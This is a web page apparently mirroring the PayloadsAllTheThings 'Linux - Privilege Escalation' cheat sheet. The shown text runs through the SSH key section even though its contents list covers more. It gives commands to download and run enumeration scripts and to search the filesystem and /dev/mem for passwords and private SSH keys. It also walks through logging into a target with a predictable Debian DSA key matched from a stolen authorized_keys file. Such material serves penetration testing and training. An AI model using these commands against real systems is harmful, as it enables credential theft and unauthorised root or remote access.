<!DOCTYPE html>



<html lang="en-US" 
  
>

  <!--
  The Head
-->

<head>
  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  

    

    

  

  <!-- Begin Jekyll SEO tag v2.7.1 -->
<meta name="generator" content="Jekyll v4.2.1" />
<meta property="og:title" content="Linux - Privilege Escalation" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="Summary" />
<meta property="og:description" content="Summary" />
<link rel="canonical" href="http://localhost:4000/Linux-Privilege-Escalation/" />
<meta property="og:url" content="http://localhost:4000/Linux-Privilege-Escalation/" />
<meta property="og:site_name" content="PayloadsAllTheThings" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2021-04-15T00:00:00+07:00" />
<meta name="twitter:card" content="summary" />
<meta property="twitter:title" content="Linux - Privilege Escalation" />
<meta name="twitter:site" content="@Zxce3_" />
<meta name="google-site-verification" content="google_meta_tag_verification" />
<script type="application/ld+json">
{"@type":"BlogPosting","headline":"Linux - Privilege Escalation","dateModified":"2021-04-15T00:00:00+07:00","datePublished":"2021-04-15T00:00:00+07:00","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/Linux-Privilege-Escalation/"},"url":"http://localhost:4000/Linux-Privilege-Escalation/","description":"Summary","@context":"https://schema.org"}</script>
<!-- End Jekyll SEO tag -->


  <title>Linux - Privilege Escalation | PayloadsAllTheThings
  </title>

  <!--
  The Favicons for Web, Android, Microsoft, and iOS (iPhone and iPad) Apps
  Generated by: https://realfavicongenerator.net/
-->



<link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png">
<link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png">
<link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png">
<link rel="manifest" href="/assets/img/favicons/site.webmanifest">
<link rel="shortcut icon" href="/assets/img/favicons/favicon.ico">
<meta name="apple-mobile-web-app-title" content="PayloadsAllTheThings">
<meta name="application-name" content="PayloadsAllTheThings">
<meta name="msapplication-TileColor" content="#da532c">
<meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml">
<meta name="theme-color" content="#ffffff">


  <!-- Google Fonts -->
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous">
  <link rel="dns-prefetch" href="https://fonts.gstatic.com">

  <!-- Google Tag and Analytics -->
  <!-- Global site tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=G-BJ57VSC3B5"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'G-BJ57VSC3B5');
</script>
<!-- Translate website -->
<script>
/*
  function googleTranslateElementInit() {

  new google.translate.TranslateElement(
    {
      pageLanguage: "en",
      includedLanguages: "en,id",
      layout: google.translate.TranslateElement.InlineLayout.SIMPLE
    },
    "google_translate_element"
  );
}
setTimeout( function() {
  googleTranslateElementInit();
  }, 500);
*/
</script>
  <!-- GA -->
  

  <!-- jsDelivr CDN -->
  <link rel="preconnect" href="https://cdn.jsdelivr.net">
  <link rel="dns-prefetch" href="https://cdn.jsdelivr.net">

  <!-- Bootstrap -->
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css">

  <!-- Font Awesome -->
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css">

  <!--
  CSS selector for site.
-->

<link rel="stylesheet" href="/assets/css/style.css">


  <link rel="stylesheet"
    href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css">



  <!-- Manific Popup -->
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css">



  <!-- JavaScripts -->
<!-- <script src="https://translate.google.com/translate_a/element.js?cb=googleTranslateElementInit"></script> -->
  <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>

  <script defer
    src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.15.0,npm/bootstrap@4/dist/js/bootstrap.min.js"></script>

  <!--
  JS selector for site.
-->


  



  <!-- image lazy-loading & popup -->
  <script async
    src="https://cdn.jsdelivr.net/combine/npm/lozad/dist/lozad.min.js,npm/magnific-popup@1/dist/jquery.magnific-popup.min.js"></script>





<script defer src="/assets/js/dist/post.min.js"></script>





</head>


  <body data-spy="scroll" data-target="#toc">

    <!--
  The Side Bar
-->

<div id="sidebar" class="d-flex flex-column align-items-end">

  <div class="profile-wrapper text-center">
    <div id="avatar">
      <a href="/" alt="avatar" class="mx-auto">
        
        <img src="/assets/img/logo.jpg" alt="avatar" onerror="this.style.display='none'">
      </a>
    </div>

    <div class="site-title mt-3">
      <a href="/">PayloadsAllTheThings</a>
    </div>

    <div class="site-subtitle font-italic">A list of useful payloads</div>

  </div><!-- .profile-wrapper -->

  <ul class="w-100">
    <!-- home -->
    <li class="nav-item">
      <a href="/" class="nav-link">
        <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i>
        <span>HOME</span>
      </a>
    </li>
    <!-- the real tabs -->
    
    <li class="nav-item">
      <a href="/categories/" class="nav-link">
        <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i>
        <span>CATEGORIES</span>
      </a>
    </li> <!-- .nav-item -->
    
    <li class="nav-item">
      <a href="/tags/" class="nav-link">
        <i class="fa-fw fas fa-tags ml-xl-3 mr-xl-3 unloaded"></i>
        <span>TAGS</span>
      </a>
    </li> <!-- .nav-item -->
    
    <li class="nav-item">
      <a href="/archives/" class="nav-link">
        <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i>
        <span>ARCHIVES</span>
      </a>
    </li> <!-- .nav-item -->
    
    <li class="nav-item">
      <a href="/about/" class="nav-link">
        <i class="fa-fw fas fa-info ml-xl-3 mr-xl-3 unloaded"></i>
        <span>ABOUT</span>
      </a>
    </li> <!-- .nav-item -->
    

  </ul> <!-- ul.nav.flex-column -->

  <div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center">

    
      

      
      <a href="https://github.com/Zxce3" aria-label="github"
        class="order-3"
        target="_blank" rel="noopener">
        <i class="fab fa-github-alt"></i>
      </a>
      

    
      

      
      <a href="https://twitter.com/Zxce3_" aria-label="twitter"
        class="order-4"
        target="_blank" rel="noopener">
        <i class="fab fa-twitter"></i>
      </a>
      

    
      

      
      <a href="
          javascript:location.href = 'mailto:' + ['Zxce3','protonmail.com'].join('@')" aria-label="email"
        class="order-5"
        >
        <i class="fas fa-envelope"></i>
      </a>
      

    
      

      
      <a href="/feed.xml" aria-label="rss"
        class="order-6"
        >
        <i class="fas fa-rss"></i>
      </a>
      

    

    
      
        <span class="icon-border order-2"></span>
      

      <span id="mode-toggle-wrapper" class="order-1">
        <!--
  Switch the mode between dark and light.
-->

<i class="mode-toggle fas fa-adjust"></i>

<script type="text/javascript">

  class ModeToggle {
    static get MODE_KEY() { return "mode"; }
    static get DARK_MODE() { return "dark"; }
    static get LIGHT_MODE() { return "light"; }

    constructor() {
      if (this.hasMode) {
        if (this.isDarkMode) {
          if (!this.isSysDarkPrefer) {
            this.setDark();
          }
        } else {
          if (this.isSysDarkPrefer) {
            this.setLight();
          }
        }
      }

      var self = this;

      /* always follow the system prefers */
      this.sysDarkPrefers.addListener(function() {
        if (self.hasMode) {
          if (self.isDarkMode) {
            if (!self.isSysDarkPrefer) {
              self.setDark();
            }

          } else {
            if (self.isSysDarkPrefer) {
              self.setLight();
            }
          }

          self.clearMode();
        }

        self.updateMermaid();
      });

    } /* constructor() */


    setDark() {
      $('html').attr(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE);
      sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE);
    }

    setLight() {
      $('html').attr(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE);
      sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE);
    }

    clearMode() {
      $('html').removeAttr(ModeToggle.MODE_KEY);
      sessionStorage.removeItem(ModeToggle.MODE_KEY);
    }

    get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); }

    get isSysDarkPrefer() { return this.sysDarkPrefers.matches; }

    get isDarkMode() { return this.mode == ModeToggle.DARK_MODE; }

    get isLightMode() { return this.mode == ModeToggle.LIGHT_MODE; }

    get hasMode() { return this.mode != null; }

    get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); }

    /* get the current mode on screen */
    get modeStatus() {
      if (this.isDarkMode
        || (!this.hasMode && this.isSysDarkPrefer) ) {
        return ModeToggle.DARK_MODE;
      } else {
        return ModeToggle.LIGHT_MODE;
      }
    }

    updateMermaid() {
      if (typeof mermaid !== "undefined") {
        let expectedTheme = (this.modeStatus === ModeToggle.DARK_MODE? "dark" : "default");
        let config = { theme: expectedTheme };

        /* re-render the SVG › <https://github.com/mermaid-js/mermaid/issues/311#issuecomment-332557344> */
        $(".mermaid").each(function() {
          let svgCode = $(this).prev().children().html();
          $(this).removeAttr("data-processed");
          $(this).html(svgCode);
        });

        mermaid.initialize(config);
        mermaid.init(undefined, ".mermaid");
      }
    }

    flipMode() {
      if (this.hasMode) {
        if (this.isSysDarkPrefer) {
          if (this.isLightMode) {
            this.clearMode();
          } else {
            this.setLight();
          }

        } else {
          if (this.isDarkMode) {
            this.clearMode();
          } else {
            this.setDark();
          }
        }

      } else {
        if (this.isSysDarkPrefer) {
          this.setLight();
        } else {
          this.setDark();
        }
      }

      this.updateMermaid();

    } /* flipMode() */

  } /* ModeToggle */

  let toggle = new ModeToggle();

  $(".mode-toggle").click(function() {

    toggle.flipMode();

  });

</script>

      </span>
    

  </div> <!-- .sidebar-bottom -->

</div><!-- #sidebar -->


    <!--
  The Top Bar
-->

<div id="topbar-wrapper" class="row justify-content-center topbar-down">
  <div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between">
    <span id="breadcrumb">

    

    

      

        
          

        

      

        
          <span>Linux - Privilege Escalation</span>

        

      

    

    </span><!-- endof #breadcrumb -->

    <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i>

    <div id="topbar-title">
      Post
    </div>

    <i id="search-trigger" class="fas fa-search fa-fw"></i>
    <span id="search-wrapper" class="align-items-center">
      <i class="fas fa-search fa-fw"></i>
      <input class="form-control" id="search-input" type="search"
        aria-label="search" autocomplete="off" placeholder="Search...">
      <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i>
    </span>
    <span id="search-cancel" >Cancel</span>
  </div>

</div>


    <div id="main-wrapper">
      <div id="main">

        <!--
  Refactor the HTML structure.
-->



<!--
  In order to allow a wide table to scroll horizontally,
  we suround the markdown table with `<div class="table-wrapper">` and `</div>`
-->


<!--
  Fixed kramdown code highlight rendering:
  https://github.com/penibelst/jekyll-compress-html/issues/101
  https://github.com/penibelst/jekyll-compress-html/issues/71#issuecomment-188144901
-->


<!-- Add attribute 'hide-bullet' to the checkbox list -->






<!-- return -->
<div class="row">

  <div id="post-wrapper" class="col-12 col-lg-11 col-xl-8">

    <div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4">

      <h1 data-toc-skip>Linux - Privilege Escalation</h1>

      <div class="post-meta text-muted d-flex flex-column">
        <!-- Published date and author -->
        <div>
          <span class="semi-bold">
            Zxce3
          </span>
          <!--
  Date format snippet
  See: /assets/js/_utils/timeage.js
-->





<span class="timeago "
  
    data-toggle="tooltip"
    data-placement="bottom"
    title="Thu, Apr 15, 2021, 12:00 AM +0700"
  

  
  prep="on" >

  
  

  
    Apr 15, 2021
  

  <i class="unloaded">2021-04-15T00:00:00+07:00</i>

</span>

        </div>

        <div>
          <!-- lastmod -->
          

          <!-- read time -->
          <!--
  Calculate the post's reading time, and display the word count in tooltip
 -->


<!-- words per minute  -->







<!-- return element -->
<span class="readtime" data-toggle="tooltip" data-placement="bottom" title="3119 words">17 min reads</span>


          <!-- page views -->
          

        </div>

      </div> <!-- .post-meta -->

      <div class="post-content">

        

        <h2 id="summary">Summary</h2>

<ul>
  <li><a href="#tools">Tools</a></li>
  <li><a href="#checklists">Checklist</a></li>
  <li><a href="#looting-for-passwords">Looting for passwords</a>
    <ul>
      <li><a href="#files-containing-passwords">Files containing passwords</a></li>
      <li><a href="#old-passwords-in--etc-security-opasswd">Old passwords in /etc/security/opasswd</a></li>
      <li><a href="#last-edited-files">Last edited files</a></li>
      <li><a href="#in-memory-passwords">In memory passwords</a></li>
      <li><a href="#find-sensitive-files">Find sensitive files</a></li>
    </ul>
  </li>
  <li><a href="#ssh-key">SSH Key</a>
    <ul>
      <li><a href="#sensitive-files">Sensitive files</a></li>
      <li><a href="#ssh-key-predictable-prng-authorized_keys-process">SSH Key Predictable PRNG (Authorized_Keys) Process</a></li>
    </ul>
  </li>
  <li><a href="#scheduled-tasks">Scheduled tasks</a>
    <ul>
      <li><a href="#cron-jobs">Cron jobs</a></li>
      <li><a href="#systemd-timers">Systemd timers</a></li>
    </ul>
  </li>
  <li><a href="#suid">SUID</a>
    <ul>
      <li><a href="#find-suid-binaries">Find SUID binaries</a></li>
      <li><a href="#create-a-suid-binary">Create a SUID binary</a></li>
    </ul>
  </li>
  <li><a href="#capabilities">Capabilities</a>
    <ul>
      <li><a href="#list-capabilities-of-binaries">List capabilities of binaries</a></li>
      <li><a href="#edit-capabilities">Edit capabilities</a></li>
      <li><a href="#interesting-capabilities">Interesting capabilities</a></li>
    </ul>
  </li>
  <li><a href="#sudo">SUDO</a>
    <ul>
      <li><a href="#nopasswd">NOPASSWD</a></li>
      <li><a href="#ld_preload-and-nopasswd">LD_PRELOAD and NOPASSWD</a></li>
      <li><a href="#doas">Doas</a></li>
      <li><a href="#sudo-inject">sudo_inject</a></li>
      <li><a href="#cve-2019-14287">CVE-2019-14287</a></li>
    </ul>
  </li>
  <li><a href="#gtfobins">GTFOBins</a></li>
  <li><a href="#wildcard">Wildcard</a></li>
  <li><a href="#writable-files">Writable files</a>
    <ul>
      <li><a href="#writable-etcpasswd">Writable /etc/passwd</a></li>
      <li><a href="#writable-etcsudoers">Writable /etc/sudoers</a></li>
    </ul>
  </li>
  <li><a href="#nfs-root-squashing">NFS Root Squashing</a></li>
  <li><a href="#shared-library">Shared Library</a>
    <ul>
      <li><a href="#ldconfig">ldconfig</a></li>
      <li><a href="#rpath">RPATH</a></li>
    </ul>
  </li>
  <li><a href="#groups">Groups</a>
    <ul>
      <li><a href="#docker">Docker</a></li>
      <li><a href="#lxclxd">LXC/LXD</a></li>
    </ul>
  </li>
  <li><a href="#kernel-exploits">Kernel Exploits</a>
    <ul>
      <li><a href="#CVE-2016-5195-dirtycow">CVE-2016-5195 (DirtyCow)</a></li>
      <li><a href="#[CVE-2010-3904-rds">CVE-2010-3904 (RDS)</a></li>
      <li><a href="#CVE-2010-4258-full-nelson">CVE-2010-4258 (Full Nelson)</a></li>
      <li><a href="#CVE-2012-0056-mempodipper">CVE-2012-0056 (Mempodipper)</a></li>
    </ul>
  </li>
</ul>

<h2 id="tools">Tools</h2>

<p>There are many scripts that you can execute on a linux machine which automatically enumerate sytem information, processes, and files to locate privilege escelation vectors.
Here are a few:</p>

<ul>
  <li>
    <p><a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS">LinPEAS - Linux Privilege Escalation Awesome Script</a></p>

    <div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre></td><td class="rouge-code"><pre><span class="w">  </span><span class="n">wget</span><span class="w"> </span><span class="s2">"https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh"</span><span class="w"> </span><span class="nt">-O</span><span class="w"> </span><span class="nx">linpeas.sh</span><span class="w">
  </span><span class="n">curl</span><span class="w"> </span><span class="s2">"https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh"</span><span class="w"> </span><span class="nt">-o</span><span class="w"> </span><span class="nx">linpeas.sh</span><span class="w">
  </span><span class="o">.</span><span class="n">/linpeas.sh</span><span class="w"> </span><span class="nt">-a</span><span class="w"> </span><span class="c">#all checks - deeper system enumeration, but it takes longer to complete.</span><span class="w">
  </span><span class="o">.</span><span class="n">/linpeas.sh</span><span class="w"> </span><span class="nt">-s</span><span class="w"> </span><span class="c">#superfast &amp; stealth - This will bypass some time consuming checks. In stealth mode Nothing will be written to the disk.</span><span class="w">
  </span><span class="o">.</span><span class="n">/linpeas.sh</span><span class="w"> </span><span class="nt">-P</span><span class="w"> </span><span class="c">#Password - Pass a password that will be used with sudo -l and bruteforcing other users</span><span class="w">
</span></pre></td></tr></tbody></table></code></div>    </div>
  </li>
  <li>
    <p><a href="https://github.com/diego-treitos/linux-smart-enumeration">LinuxSmartEnumeration - Linux enumeration tools for pentesting and CTFs</a></p>

    <div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre></td><td class="rouge-code"><pre><span class="w">  </span><span class="n">wget</span><span class="w"> </span><span class="s2">"https://raw.githubusercontent.com/diego-treitos/linux-smart-enumeration/master/lse.sh"</span><span class="w"> </span><span class="nt">-O</span><span class="w"> </span><span class="nx">lse.sh</span><span class="w">
  </span><span class="n">curl</span><span class="w"> </span><span class="s2">"https://raw.githubusercontent.com/diego-treitos/linux-smart-enumeration/master/lse.sh"</span><span class="w"> </span><span class="nt">-o</span><span class="w"> </span><span class="nx">lse.sh</span><span class="w">
  </span><span class="o">.</span><span class="n">/lse.sh</span><span class="w"> </span><span class="nt">-l1</span><span class="w"> </span><span class="c"># shows interesting information that should help you to privesc</span><span class="w">
  </span><span class="o">.</span><span class="n">/lse.sh</span><span class="w"> </span><span class="nt">-l2</span><span class="w"> </span><span class="c"># dump all the information it gathers about the system</span><span class="w">
</span></pre></td></tr></tbody></table></code></div>    </div>
  </li>
  <li>
    <p><a href="https://github.com/rebootuser/LinEnum">LinEnum - Scripted Local Linux Enumeration &amp; Privilege Escalation Checks</a></p>

    <div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="w">  </span><span class="o">.</span><span class="n">/LinEnum.sh</span><span class="w"> </span><span class="nt">-s</span><span class="w"> </span><span class="nt">-k</span><span class="w"> </span><span class="nx">keyword</span><span class="w"> </span><span class="nt">-r</span><span class="w"> </span><span class="nx">report</span><span class="w"> </span><span class="nt">-e</span><span class="w"> </span><span class="nx">/tmp/</span><span class="w"> </span><span class="nt">-t</span><span class="w">
</span></pre></td></tr></tbody></table></code></div>    </div>
  </li>
  <li><a href="https://github.com/AlessandroZ/BeRoot">BeRoot - Privilege Escalation Project - Windows / Linux / Mac</a></li>
  <li><a href="https://github.com/sleventyeleven/linuxprivchecker">linuxprivchecker.py - a Linux Privilege Escalation Check Script</a></li>
  <li><a href="https://github.com/pentestmonkey/unix-privesc-check">unix-privesc-check - Automatically exported from code.google.com/p/unix-privesc-check</a></li>
  <li><a href="https://github.com/TH3xACE/SUDO_KILLER">Privilege Escalation through sudo - Linux</a></li>
</ul>

<h2 id="checklists">Checklists</h2>

<ul>
  <li>Kernel and distribution release details</li>
  <li>System Information:
    <ul>
      <li>Hostname</li>
      <li>Networking details:</li>
      <li>Current IP</li>
      <li>Default route details</li>
      <li>DNS server information</li>
    </ul>
  </li>
  <li>User Information:
    <ul>
      <li>Current user details</li>
      <li>Last logged on users</li>
      <li>Shows users logged onto the host</li>
      <li>List all users including uid/gid information</li>
      <li>List root accounts</li>
      <li>Extracts password policies and hash storage method information</li>
      <li>Checks umask value</li>
      <li>Checks if password hashes are stored in /etc/passwd</li>
      <li>Extract full details for ‘default’ uid’s such as 0, 1000, 1001 etc</li>
      <li>Attempt to read restricted files i.e. /etc/shadow</li>
      <li>List current users history files (i.e .bash_history, .nano_history, .mysql_history , etc.)</li>
      <li>Basic SSH checks</li>
    </ul>
  </li>
  <li>Privileged access:
    <ul>
      <li>Which users have recently used sudo</li>
      <li>Determine if /etc/sudoers is accessible</li>
      <li>Determine if the current user has Sudo access without a password</li>
      <li>Are known ‘good’ breakout binaries available via Sudo (i.e. nmap, vim etc.)</li>
      <li>Is root’s home directory accessible</li>
      <li>List permissions for /home/</li>
    </ul>
  </li>
  <li>Environmental:
    <ul>
      <li>Display current $PATH</li>
      <li>Displays env information</li>
    </ul>
  </li>
  <li>Jobs/Tasks:
    <ul>
      <li>List all cron jobs</li>
      <li>Locate all world-writable cron jobs</li>
      <li>Locate cron jobs owned by other users of the system</li>
      <li>List the active and inactive systemd timers</li>
    </ul>
  </li>
  <li>Services:
    <ul>
      <li>List network connections (TCP &amp; UDP)</li>
      <li>List running processes</li>
      <li>Lookup and list process binaries and associated permissions</li>
      <li>List inetd.conf/xined.conf contents and associated binary file permissions</li>
      <li>List init.d binary permissions</li>
    </ul>
  </li>
  <li>Version Information (of the following):
    <ul>
      <li>Sudo</li>
      <li>MYSQL</li>
      <li>Postgres</li>
      <li>Apache
        <ul>
          <li>Checks user config</li>
          <li>Shows enabled modules</li>
          <li>Checks for htpasswd files</li>
          <li>View www directories</li>
        </ul>
      </li>
    </ul>
  </li>
  <li>Default/Weak Credentials:
    <ul>
      <li>Checks for default/weak Postgres accounts</li>
      <li>Checks for default/weak MYSQL accounts</li>
    </ul>
  </li>
  <li>Searches:
    <ul>
      <li>Locate all SUID/GUID files</li>
      <li>Locate all world-writable SUID/GUID files</li>
      <li>Locate all SUID/GUID files owned by root</li>
      <li>Locate ‘interesting’ SUID/GUID files (i.e. nmap, vim etc)</li>
      <li>Locate files with POSIX capabilities</li>
      <li>List all world-writable files</li>
      <li>Find/list all accessible *.plan files and display contents</li>
      <li>Find/list all accessible *.rhosts files and display contents</li>
      <li>Show NFS server details</li>
      <li>Locate *.conf and *.log files containing keyword supplied at script runtime</li>
      <li>List all *.conf files located in /etc</li>
      <li>Locate mail</li>
    </ul>
  </li>
  <li>Platform/software specific tests:
    <ul>
      <li>Checks to determine if we’re in a Docker container</li>
      <li>Checks to see if the host has Docker installed</li>
      <li>Checks to determine if we’re in an LXC container</li>
    </ul>
  </li>
</ul>

<h2 id="looting-for-passwords">Looting for passwords</h2>

<h3 id="files-containing-passwords">Files containing passwords</h3>

<div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre><span class="n">grep</span><span class="w"> </span><span class="nt">--color</span><span class="o">=</span><span class="n">auto</span><span class="w"> </span><span class="nt">-rnw</span><span class="w"> </span><span class="s1">'/'</span><span class="w"> </span><span class="nt">-ie</span><span class="w"> </span><span class="s2">"PASSWORD"</span><span class="w"> </span><span class="nt">--color</span><span class="o">=</span><span class="n">always</span><span class="w"> </span><span class="nx">2</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">/dev/null</span><span class="w">
</span><span class="n">find</span><span class="w"> </span><span class="o">.</span><span class="w"> </span><span class="nt">-type</span><span class="w"> </span><span class="nx">f</span><span class="w"> </span><span class="nt">-exec</span><span class="w"> </span><span class="nx">grep</span><span class="w"> </span><span class="nt">-i</span><span class="w"> </span><span class="nt">-I</span><span class="w"> </span><span class="s2">"PASSWORD"</span><span class="w"> </span><span class="p">{}</span><span class="w"> </span><span class="n">/dev/null</span><span class="w"> </span><span class="nx">\</span><span class="p">;</span><span class="w">
</span></pre></td></tr></tbody></table></code></div></div>

<h3 id="old-passwords-in-etcsecurityopasswd">Old passwords in /etc/security/opasswd</h3>

<p>The <code class="language-plaintext highlighter-rouge">/etc/security/opasswd</code> file is used also by pam_cracklib to keep the history of old passwords so that the user will not reuse them.</p>

<p>:warning: Treat your opasswd file like your /etc/shadow file because it will end up containing user password hashes</p>

<h3 id="last-edited-files">Last edited files</h3>

<p>Files that were edited in the last 10 minutes</p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="n">find</span><span class="w"> </span><span class="nx">/</span><span class="w"> </span><span class="nt">-mmin</span><span class="w"> </span><span class="nt">-10</span><span class="w"> </span><span class="nx">2</span><span class="err">&gt;</span><span class="nx">/dev/null</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">grep</span><span class="w"> </span><span class="nt">-Ev</span><span class="w"> </span><span class="s2">"^/proc"</span><span class="w">
</span></pre></td></tr></tbody></table></code></div></div>

<h3 id="in-memory-passwords">In memory passwords</h3>

<div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="n">strings</span><span class="w"> </span><span class="nx">/dev/mem</span><span class="w"> </span><span class="nt">-n10</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">grep</span><span class="w"> </span><span class="nt">-i</span><span class="w"> </span><span class="nx">PASS</span><span class="w">
</span></pre></td></tr></tbody></table></code></div></div>

<h3 id="find-sensitive-files">Find sensitive files</h3>

<div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre></td><td class="rouge-code"><pre><span class="err">$</span><span class="w"> </span><span class="n">locate</span><span class="w"> </span><span class="nx">password</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">more</span><span class="w">           
</span><span class="n">/boot/grub/i386-pc/password.mod</span><span class="w">
</span><span class="nx">/etc/pam.d/common-password</span><span class="w">
</span><span class="n">/etc/pam.d/gdm-password</span><span class="w">
</span><span class="nx">/etc/pam.d/gdm-password.original</span><span class="w">
</span><span class="n">/lib/live/config/0031-root-password</span><span class="w">
</span><span class="o">...</span><span class="w">
</span></pre></td></tr></tbody></table></code></div></div>

<h2 id="ssh-key">SSH Key</h2>

<h3 id="sensitive-files">Sensitive files</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre></td><td class="rouge-code"><pre>find / -name authorized_keys 2&gt; /dev/null
find / -name id_rsa 2&gt; /dev/null
...
</pre></td></tr></tbody></table></code></div></div>

<h3 id="ssh-key-predictable-prng-authorized_keys-process">SSH Key Predictable PRNG (Authorized_Keys) Process</h3>

<p>This module describes how to attempt to use an obtained authorized_keys file on a host system.</p>

<p>Needed : SSH-DSS String from authorized_keys file</p>

<p><strong>Steps</strong></p>

<ol>
  <li>Get the authorized_keys file. An example of this file would look like so:</li>
</ol>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>ssh-dss AAAA487rt384ufrgh432087fhy02nv84u7fg839247fg8743gf087b3849yb98304yb9v834ybf ... (snipped) ... 
</pre></td></tr></tbody></table></code></div></div>

<ol>
  <li>Since this is an ssh-dss key, we need to add that to our local copy of <code class="language-plaintext highlighter-rouge">/etc/ssh/ssh_config</code> and <code class="language-plaintext highlighter-rouge">/etc/ssh/sshd_config</code>:</li>
</ol>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre></td><td class="rouge-code"><pre>echo "PubkeyAcceptedKeyTypes=+ssh-dss" &gt;&gt; /etc/ssh/ssh_config
echo "PubkeyAcceptedKeyTypes=+ssh-dss" &gt;&gt; /etc/ssh/sshd_config
/etc/init.d/ssh restart
</pre></td></tr></tbody></table></code></div></div>

<ol>
  <li>Get <a href="https://github.com/g0tmi1k/debian-ssh">g0tmi1k’s debian-ssh repository</a> and unpack the keys:</li>
</ol>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre></td><td class="rouge-code"><pre>git clone https://github.com/g0tmi1k/debian-ssh
cd debian-ssh
tar vjxf common_keys/debian_ssh_dsa_1024_x86.tar.bz2
</pre></td></tr></tbody></table></code></div></div>

<ol>
  <li>Grab the first 20 or 30 bytes from the key file shown above starting with the <code class="language-plaintext highlighter-rouge">"AAAA..."</code> portion and grep the unpacked keys with it as:</li>
</ol>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre>grep -lr 'AAAA487rt384ufrgh432087fhy02nv84u7fg839247fg8743gf087b3849yb98304yb9v834ybf'
dsa/1024/68b329da9893e34099c7d8ad5cb9c940-17934.pub
</pre></td></tr></tbody></table></code></div></div>

<ol>
  <li>IF SUCCESSFUL, this will return a file (68b329da9893e34099c7d8ad5cb9c940-17934.pub) public file. To use the private key file to connect, drop the ‘.pub’ extension and do:</li>
</ol>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>ssh -vvv victim@target -i 68b329da9893e34099c7d8ad5cb9c940-17934
</pre></td></tr></tbody></table></code></div></div>

